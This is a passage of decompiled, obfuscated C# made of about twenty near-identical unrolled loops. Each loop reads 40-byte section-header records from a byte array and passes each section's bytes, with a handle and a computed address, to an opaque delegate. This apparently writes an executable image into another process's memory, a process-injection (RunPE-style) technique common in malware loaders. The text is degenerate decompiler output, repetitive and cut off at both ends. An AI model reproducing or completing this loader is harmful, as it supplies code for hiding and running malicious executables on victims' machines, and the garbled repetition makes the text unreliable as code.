						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3930] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3930] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1320)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1324)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1328)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3928] = ((*(int*)((byte*)ptr + 1324) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3928] != 0)
					{
						byte[] array109;
						checked
						{
							array109 = new byte[*unchecked((int*)((byte*)ptr + 1324)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1328), array109, 0, array109.Length);
						((byte*)ptr)[3929] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1320))), array109, array109.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3929] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3933] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3933] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1332)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1336)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1340)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3931] = ((*(int*)((byte*)ptr + 1336) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3931] != 0)
					{
						byte[] array110;
						checked
						{
							array110 = new byte[*unchecked((int*)((byte*)ptr + 1336)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1340), array110, 0, array110.Length);
						((byte*)ptr)[3932] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1332))), array110, array110.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3932] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3936] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3936] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1344)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1348)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1352)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3934] = ((*(int*)((byte*)ptr + 1348) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3934] != 0)
					{
						byte[] array111;
						checked
						{
							array111 = new byte[*unchecked((int*)((byte*)ptr + 1348)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1352), array111, 0, array111.Length);
						((byte*)ptr)[3935] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1344))), array111, array111.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3935] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3939] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3939] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1356)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1360)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1364)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3937] = ((*(int*)((byte*)ptr + 1360) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3937] != 0)
					{
						byte[] array112;
						checked
						{
							array112 = new byte[*unchecked((int*)((byte*)ptr + 1360)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1364), array112, 0, array112.Length);
						((byte*)ptr)[3938] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1356))), array112, array112.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3938] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3942] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3942] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1368)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1372)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1376)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3940] = ((*(int*)((byte*)ptr + 1372) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3940] != 0)
					{
						byte[] array113;
						checked
						{
							array113 = new byte[*unchecked((int*)((byte*)ptr + 1372)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1376), array113, 0, array113.Length);
						((byte*)ptr)[3941] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1368))), array113, array113.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3941] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3945] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3945] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1380)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1384)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1388)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3943] = ((*(int*)((byte*)ptr + 1384) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3943] != 0)
					{
						byte[] array114;
						checked
						{
							array114 = new byte[*unchecked((int*)((byte*)ptr + 1384)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1388), array114, 0, array114.Length);
						((byte*)ptr)[3944] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1380))), array114, array114.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3944] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3948] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3948] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1392)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1396)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1400)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3946] = ((*(int*)((byte*)ptr + 1396) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3946] != 0)
					{
						byte[] array115;
						checked
						{
							array115 = new byte[*unchecked((int*)((byte*)ptr + 1396)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1400), array115, 0, array115.Length);
						((byte*)ptr)[3947] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1392))), array115, array115.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3947] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3951] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3951] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1404)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1408)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1412)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3949] = ((*(int*)((byte*)ptr + 1408) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3949] != 0)
					{
						byte[] array116;
						checked
						{
							array116 = new byte[*unchecked((int*)((byte*)ptr + 1408)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1412), array116, 0, array116.Length);
						((byte*)ptr)[3950] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1404))), array116, array116.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3950] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3954] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3954] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1416)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1420)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1424)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3952] = ((*(int*)((byte*)ptr + 1420) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3952] != 0)
					{
						byte[] array117;
						checked
						{
							array117 = new byte[*unchecked((int*)((byte*)ptr + 1420)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1424), array117, 0, array117.Length);
						((byte*)ptr)[3953] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1416))), array117, array117.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3953] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3957] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3957] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1428)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1432)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1436)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3955] = ((*(int*)((byte*)ptr + 1432) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3955] != 0)
					{
						byte[] array118;
						checked
						{
							array118 = new byte[*unchecked((int*)((byte*)ptr + 1432)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1436), array118, 0, array118.Length);
						((byte*)ptr)[3956] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1428))), array118, array118.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3956] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3960] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3960] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1440)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1444)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1448)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3958] = ((*(int*)((byte*)ptr + 1444) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3958] != 0)
					{
						byte[] array119;
						checked
						{
							array119 = new byte[*unchecked((int*)((byte*)ptr + 1444)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1448), array119, 0, array119.Length);
						((byte*)ptr)[3959] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1440))), array119, array119.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3959] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3963] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3963] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1452)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1456)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1460)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3961] = ((*(int*)((byte*)ptr + 1456) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3961] != 0)
					{
						byte[] array120;
						checked
						{
							array120 = new byte[*unchecked((int*)((byte*)ptr + 1456)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1460), array120, 0, array120.Length);
						((byte*)ptr)[3962] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1452))), array120, array120.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3962] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3966] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3966] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1464)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1468)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1472)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3964] = ((*(int*)((byte*)ptr + 1468) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3964] != 0)
					{
						byte[] array121;
						checked
						{
							array121 = new byte[*unchecked((int*)((byte*)ptr + 1468)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1472), array121, 0, array121.Length);
						((byte*)ptr)[3965] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1464))), array121, array121.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3965] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3969] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3969] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1476)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1480)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1484)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3967] = ((*(int*)((byte*)ptr + 1480) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3967] != 0)
					{
						byte[] array122;
						checked
						{
							array122 = new byte[*unchecked((int*)((byte*)ptr + 1480)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1484), array122, 0, array122.Length);
						((byte*)ptr)[3968] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1476))), array122, array122.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3968] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3972] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3972] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1488)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1492)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1496)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3970] = ((*(int*)((byte*)ptr + 1492) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3970] != 0)
					{
						byte[] array123;
						checked
						{
							array123 = new byte[*unchecked((int*)((byte*)ptr + 1492)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1496), array123, 0, array123.Length);
						((byte*)ptr)[3971] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1488))), array123, array123.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3971] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3975] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3975] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1500)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1504)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1508)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3973] = ((*(int*)((byte*)ptr + 1504) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3973] != 0)
					{
						byte[] array124;
						checked
						{
							array124 = new byte[*unchecked((int*)((byte*)ptr + 1504)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1508), array124, 0, array124.Length);
						((byte*)ptr)[3974] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1500))), array124, array124.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3974] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3978] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3978] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1512)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1516)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1520)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3976] = ((*(int*)((byte*)ptr + 1516) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3976] != 0)
					{
						byte[] array125;
						checked
						{
							array125 = new byte[*unchecked((int*)((byte*)ptr + 1516)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1520), array125, 0, array125.Length);
						((byte*)ptr)[3977] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1512))), array125, array125.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3977] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3981] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3981] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1524)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1528)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1532)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3979] = ((*(int*)((byte*)ptr + 1528) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3979] != 0)
					{
						byte[] array126;
						checked
						{
							array126 = new byte[*unchecked((int*)((byte*)ptr + 1528)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1532), array126, 0, array126.Length);
						((byte*)ptr)[3980] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1524))), array126, array126.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3980] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3984] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3984] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1536)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1540)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1544)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3982] = ((*(int*)((byte*)ptr + 1540) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3982] != 0)
					{
						byte[] array127;
						checked
						{
							array127 = new byte[*unchecked((int*)((byte*)ptr + 1540)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1544), array127, 0, array127.Length);
						((byte*)ptr)[3983] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1536))), array127, array127.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3983] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3987] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3987] == 0)
					{
						break;
					}
					checked
					{
